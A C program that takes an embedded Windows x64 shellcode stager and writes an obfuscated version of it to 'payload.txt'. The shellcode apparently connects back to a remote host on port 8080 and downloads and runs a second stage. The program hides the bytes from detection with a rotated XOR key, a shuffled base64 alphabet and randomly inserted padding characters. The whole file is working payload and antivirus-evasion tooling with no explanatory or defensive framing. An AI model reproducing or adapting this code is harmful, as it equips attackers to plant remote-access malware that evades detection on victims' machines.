#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

static char base64_table[] = "i78NfAguvwxY0kZ345lMh9jCXabcJKLV2WI16+/QROPrstTUByzmnopDEFGHdeSq";
static char key[] = "Sqr+/QR*79!Ag9zwxYZOPra)tTUBykf(0deEFGH45Wmnopuv3AeMhi7I16B&jCXabcJ0lsDKLV238N";
static long base64_table_iv = 3333333;
static long key_iv = 99999999;


char generate_random_char() {
    int index = rand() % 62;
    if (index < 10) {
        return '0' + index;
    } else if (index < 36) {
        return 'A' + (index - 10);
    } else {
        return 'a' + (index - 36);
    }
}
void fill_characters(unsigned char * start, unsigned char * end, int interval_num, int len) {
    int flag = 1;
    end[0] = '0' + interval_num;
    for (int i = 0; i < len; ++i) {
        if (flag % interval_num == 0) {
            end[flag] = generate_random_char();
            ++flag;
        }
        end[flag] = start[i];
        ++flag;
    }
}

void base64_encode(unsigned char *input, int length, unsigned char *output) {
    int i, j;
    for (i = 0, j = 0; i < length;) {
        unsigned int octet_a = i < length ? input[i++] : 0;
        unsigned int octet_b = i < length ? input[i++] : 0;
        unsigned int octet_c = i < length ? input[i++] : 0;
        unsigned int triple = (octet_a << 16) + (octet_b << 8) + octet_c;
        output[j++] = base64_table[(triple >> 18) & 0x3F];
        output[j++] = base64_table[(triple >> 12) & 0x3F];
        output[j++] = (i > length + 1) ? '=' : base64_table[(triple >> 6) & 0x3F];
        output[j++] = (i > length) ? '=' : base64_table[triple & 0x3F];
    }
    output[j] = '\0';
}

void adjust_first_to_last(char *array) {
    int length = strlen(array);
    if (length > 1) {
        char first_char = array[0];
        for (int i = 1; i < length; i++) {
            array[i - 1] = array[i];
        }
        array[length - 1] = first_char;
    }
}

void xor_encrypt_decrypt(unsigned char *input, unsigned char *output, char *key, int len) {
    int key_length = strlen(key);
    for (int i = 0; i < len; i++) {
        output[i] = input[i] ^ key[i % key_length];
    }
    output[len] = '\0';
}

void write_string_to_file(const char *filename, const char *str) {
    FILE *file = fopen(filename, "w");
    if (file == NULL) {
        perror("Error opening file");
        return;
    }
    fprintf(file, "%s", str);
    fclose(file);
}

int main() {
    unsigned char buf[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18"
        "\x48\x8b\x52\x20\x56\x4d\x31\xc9\x48\x8b\x72\x50\x48\x0f"
        "\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x8b"
        "\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x41\x51\x0f"
        "\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
        "\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x8b\x48\x18\x49"
        "\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88"
        "\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
        "\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
        "\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
        "\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x48\x01"
        "\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
        "\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
        "\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
        "\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
        "\x89\xe5\x49\xbc\x02\x00\x1f\x90\xc0\xa8\xe8\x80\x41\x54"
        "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
        "\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
        "\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
        "\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
        "\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
        "\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
        "\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
        "\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
        "\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
        "\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
        "\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
        "\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
        "\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
        "\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
        "\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
        "\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
        "\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
        "\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
        "\xf0\xb5\xa2\x56\xff\xd5";
    unsigned char encoded[2048];
    unsigned char encrypted[2048];
    
    for(long i = 0; i<base64_table_iv % strlen(base64_table); i++){
        adjust_first_to_last(base64_table);
    }
    for(long i = 0; i<key_iv % strlen(key); i++){
        adjust_first_to_last(key);
    }
    xor_encrypt_decrypt(buf, encrypted, key, sizeof(buf) / sizeof(buf[0]) - 1);
    base64_encode(encrypted, sizeof(buf) / sizeof(buf[0]), encoded);
    srand(time(NULL));
    int interval_num = rand() % 5 + 4;
    fill_characters(encoded, encrypted, interval_num, sizeof(encoded)/sizeof(encoded[0]));
    write_string_to_file("payload.txt", encrypted);
}